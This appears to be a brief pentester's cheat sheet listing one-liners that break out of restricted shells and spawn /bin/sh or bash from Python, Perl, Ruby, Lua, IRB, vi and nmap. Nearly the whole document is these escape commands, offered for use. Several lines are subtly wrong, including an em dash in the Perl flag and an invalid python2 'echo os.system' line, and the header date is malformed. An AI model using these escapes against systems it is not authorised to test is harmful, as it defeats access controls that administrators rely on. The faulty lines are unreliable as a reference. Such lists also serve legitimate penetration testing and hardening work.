---
title: Spawn
author: i4
date: M11-02-2022
---
# Spawn /bin/sh from restricted environments

Ways to escape a restricted environment
```
python3
python -c 'import pty; pty.spawn("/bin/sh")'

python2
echo os.system('/bin/bash')

sh:
/bin/sh -i

perl: 
exec "/bin/sh";
perl —e 'exec "/bin/sh";'

ruby: 
exec "/bin/sh"

lua: 
os.execute('/bin/sh')

(From within IRB)
exec "/bin/sh"

(From within vi)
:!bash
:set shell=/bin/bash:shell

(From within nmap)
!sh
```
